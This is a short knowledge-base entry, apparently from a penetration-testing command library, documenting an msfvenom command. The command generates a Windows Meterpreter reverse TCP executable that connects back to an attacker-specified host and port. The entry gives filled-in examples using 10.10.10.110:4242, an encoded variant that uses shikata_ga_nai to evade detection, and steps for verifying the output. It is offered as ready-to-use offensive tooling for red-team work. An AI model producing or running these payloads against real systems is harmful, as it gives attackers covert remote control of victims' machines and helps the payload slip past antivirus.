---
id: 6e2bfc95-8f4c-439a-873d-bb12c40f13b4
name: msfvenom-generate-windows-meterpreter-reverse-tcp-exe
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f
  exe > $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275266+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Windows
tags:
  - meterpreter
  - reverse-tcp
  - payload-generation
verified: true
validated: true
---

# msfvenom-generate-windows-meterpreter-reverse-tcp-exe

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f exe > $_OUTPUT_FILE
```

## Description

Generates a Windows Meterpreter reverse TCP payload as an EXE executable using msfvenom, suitable for running on Windows targets to establish a remote session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p windows/meterpreter/reverse_tcp | Payload type for Windows reverse Meterpreter | Yes |
| LHOST="$_LHOST" | Attacker IP for connection | Yes |
| LPORT="$_LPORT" | Listening port | Yes |
| -f exe | Output as Windows executable | Yes |
| > $_OUTPUT_FILE | Output file (e.g., shell.exe) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
```

### Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe -i 5 -e x86/shikata_ga_nai > encoded_shell.exe
```

## Expected Output

Creates 'shell.exe' file. Example verification:

```bash
file shell.exe
shell.exe: PE32 executable (console) Intel 80386, for MS Windows
```

Size around 38 KB. No console output; success is file generation.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
